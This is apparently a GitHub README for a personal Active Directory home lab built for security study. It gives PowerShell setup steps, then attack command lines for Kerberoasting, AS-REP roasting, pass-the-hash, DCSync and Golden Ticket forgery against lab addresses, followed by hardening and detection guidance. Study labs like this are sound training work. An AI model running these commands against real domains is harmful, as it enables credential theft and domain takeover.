# 🏰 Active Directory Home Lab

![AD](https://img.shields.io/badge/Active%20Directory-Lab-blue?style=for-the-badge&logo=windows)
![Status](https://img.shields.io/badge/Status-Active-green?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows%20Server-0078D6?style=for-the-badge&logo=windows)

A personal home lab for learning, attacking, and defending **Active Directory** — the core of most enterprise environments. Built for CEH & SOC Analyst preparation.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Lab Topology](#lab-topology)
- [Hardware & Software](#hardware--software)
- [Lab Setup Guide](#lab-setup-guide)
- [AD Structure](#ad-structure)
- [Attack Techniques](#attack-techniques)
- [Defense & Detection](#defense--detection)
- [Scripts](#scripts)
- [Writeups](#writeups)
- [Resources](#resources)

---

## 🧭 Overview

This lab simulates a real enterprise Active Directory environment to:

- Practice **offensive** techniques (enumeration, lateral movement, privilege escalation)
- Build **defensive** skills (detection, hardening, monitoring)
- Prepare for **CEH**, **CompTIA Security+**, and **SOC Analyst** roles
- Understand how real attackers target AD environments

---

## 🗺️ Lab Topology

```
┌─────────────────────────────────────────────┐
│              HOME LAB NETWORK               │
│                192.168.10.0/24              │
│                                             │
│  ┌─────────────────┐   ┌─────────────────┐  │
│  │  Domain Controller  │   │  Windows Server │  │
│  │  Windows Server │   │  (Member Server)│  │
│  │  192.168.10.10  │   │  192.168.10.11  │  │
│  │  brainrotshiva  │   │                 │  │
│  │  .local         │   │                 │  │
│  └────────┬────────┘   └────────┬────────┘  │
│           │                     │           │
│  ┌────────┴─────────────────────┴────────┐  │
│  │            Network Switch             │  │
│  └──────┬──────────────────┬────────────┘  │
│         │                  │               │
│  ┌──────┴──────┐   ┌───────┴─────┐        │
│  │  Windows 10 │   │  Kali Linux │        │
│  │  (Victim)   │   │  (Attacker) │        │
│  │192.168.10.20│   │192.168.10.30│        │
│  └─────────────┘   └─────────────┘        │
└─────────────────────────────────────────────┘
```

---

## 🖥️ Hardware & Software

### Hardware

| Component | Details |
|-----------|---------|
| Host Machine | (Your PC / Laptop) |
| RAM | Minimum 16GB recommended |
| Storage | Minimum 100GB free |
| Hypervisor | VMware Workstation / VirtualBox / Proxmox |

### Virtual Machines

| VM | OS | IP | Role |
|----|----|----|------|
| DC01 | Windows Server 2022 | 192.168.10.10 | Domain Controller |
| SRV01 | Windows Server 2022 | 192.168.10.11 | Member Server |
| WIN10 | Windows 10 Pro | 192.168.10.20 | Victim Workstation |
| KALI | Kali Linux 2024 | 192.168.10.30 | Attacker Machine |

---

## 🚀 Lab Setup Guide

### Step 1 — Download ISOs

- [Windows Server 2022 Evaluation](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022)
- [Windows 10 Evaluation](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise)
- [Kali Linux](https://www.kali.org/get-kali/)

### Step 2 — Install Domain Controller

```powershell
# Install AD DS Role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest `
  -DomainName "brainrotshiva.local" `
  -DomainNetbiosName "BRAINROTSHIVA" `
  -ForestMode "WinThreshold" `
  -DomainMode "WinThreshold" `
  -InstallDns:$true `
  -Force:$true
```

### Step 3 — Create Users & Groups

```powershell
# Create OUs
New-ADOrganizationalUnit -Name "IT" -Path "DC=brainrotshiva,DC=local"
New-ADOrganizationalUnit -Name "HR" -Path "DC=brainrotshiva,DC=local"
New-ADOrganizationalUnit -Name "Finance" -Path "DC=brainrotshiva,DC=local"

# Create Users
New-ADUser -Name "John Smith" -GivenName "John" -Surname "Smith" `
  -SamAccountName "jsmith" -UserPrincipalName "jsmith@brainrotshiva.local" `
  -Path "OU=IT,DC=brainrotshiva,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
  -Enabled $true

# Create Groups
New-ADGroup -Name "IT-Admins" -GroupScope Global -Path "OU=IT,DC=brainrotshiva,DC=local"
```

### Step 4 — Join Workstation to Domain

```powershell
# On Windows 10 machine
Add-Computer -DomainName "brainrotshiva.local" -Restart
```

---

## 🏛️ AD Structure

```
brainrotshiva.local
├── OU=IT
│   ├── jsmith (IT Admin)
│   ├── Group: IT-Admins
│   └── Group: Help-Desk
├── OU=HR
│   ├── hrnuser
│   └── Group: HR-Staff
├── OU=Finance
│   ├── finuser
│   └── Group: Finance-Team
└── OU=Workstations
    └── WIN10-01
```

---

## ⚔️ Attack Techniques

> ⚠️ **For educational purposes only. Only perform on your own lab.**

### 1. Enumeration

```bash
# BloodHound — AD enumeration
bloodhound-python -u jsmith -p Password123! -d brainrotshiva.local -ns 192.168.10.10 -c all

# Enum4linux
enum4linux -a 192.168.10.10

# Nmap AD scan
nmap -p 389,636,3268,3269 --script ldap-rootdse 192.168.10.10
```

### 2. Password Attacks

```bash
# Kerbrute — user enumeration
kerbrute userenum --dc 192.168.10.10 -d brainrotshiva.local userlist.txt

# AS-REP Roasting
impacket-GetNPUsers brainrotshiva.local/ -usersfile users.txt -no-pass -dc-ip 192.168.10.10

# Kerberoasting
impacket-GetUserSPNs brainrotshiva.local/jsmith:Password123! -dc-ip 192.168.10.10 -request
```

### 3. Lateral Movement

```bash
# Pass the Hash
impacket-psexec brainrotshiva.local/Administrator@192.168.10.20 -hashes :NTLMHASH

# WinRM
evil-winrm -i 192.168.10.20 -u Administrator -p Password123!
```

### 4. Privilege Escalation

```bash
# DCSync Attack
impacket-secretsdump brainrotshiva.local/Administrator:Password123!@192.168.10.10

# Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain brainrotshiva.local Administrator
```

---

## 🛡️ Defense & Detection

### Hardening Checklist

- [x] Enable audit policies (logon events, object access)
- [x] Disable LLMNR and NBT-NS
- [x] Enable SMB signing
- [x] Disable NTLM where possible
- [x] Implement LAPS (Local Admin Password Solution)
- [x] Enable Protected Users security group
- [ ] Deploy Microsoft Defender for Identity
- [ ] Configure fine-grained password policies
- [ ] Tier model for admin accounts

### Key Windows Event IDs to Monitor

| Event ID | Description | Attack |
|----------|-------------|--------|
| 4625 | Failed logon | Brute force |
| 4768 | Kerberos TGT request | AS-REP Roast |
| 4769 | Kerberos service ticket | Kerberoasting |
| 4672 | Special privileges assigned | Privilege escalation |
| 4624 | Successful logon | Pass the Hash |
| 4776 | NTLM authentication | Pass the Hash |
| 7045 | New service installed | Persistence |

### Detection Rules (Sigma)

```yaml
# Kerberoasting Detection
title: Kerberoasting Attack
status: experimental
description: Detects Kerberoasting attempts via unusual TGS requests
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  condition: selection
falsepositives:
  - Legacy systems using RC4
level: high
```

---

## 📜 Scripts

### `scripts/create-users.ps1`
Bulk create AD users for lab testing.

### `scripts/ad-enum.sh`
Automated AD enumeration from Kali Linux.

### `scripts/hardening.ps1`
Apply security hardening to Domain Controller.

### `scripts/event-monitor.ps1`
Monitor key Windows Event IDs in real time.

> All scripts are in the `/scripts` folder.

---

## 📝 Writeups

| Topic | Status |
|-------|--------|
| AS-REP Roasting | 🔜 Coming soon |
| Kerberoasting | 🔜 Coming soon |
| BloodHound enumeration | 🔜 Coming soon |
| DCSync attack | 🔜 Coming soon |
| Golden Ticket | 🔜 Coming soon |
| AD Hardening | 🔜 Coming soon |

---

## 📚 Resources

- 🌐 [Microsoft AD Documentation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/)
- 🎥 [TCM Security — Practical Ethical Hacking](https://academy.tcm-sec.com/)
- 🎥 [John Hammond — AD Attack Videos](https://www.youtube.com/@_JohnHammond)
- 🔴 [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- 🔴 [Impacket](https://github.com/SecureAuthCorp/impacket)
- 📖 [HackTricks — AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- 🟡 [TryHackMe — AD Rooms](https://tryhackme.com/module/hacking-active-directory)

---

## 👤 Author

**brainrotshiva**
- GitHub: [@brainrotshiva](https://github.com/brainrotshiva)
- 🔐 Cybersecurity Enthusiast | B.Sc Computer Science
- 🎯 Aspiring CEH & SOC Analyst
- 📍 Hyderabad, India

---

> ⚠️ **Disclaimer:** This lab is for **educational purposes only**. All attacks are performed in an isolated home lab environment. Never perform these techniques on systems you do not own or have explicit permission to test.
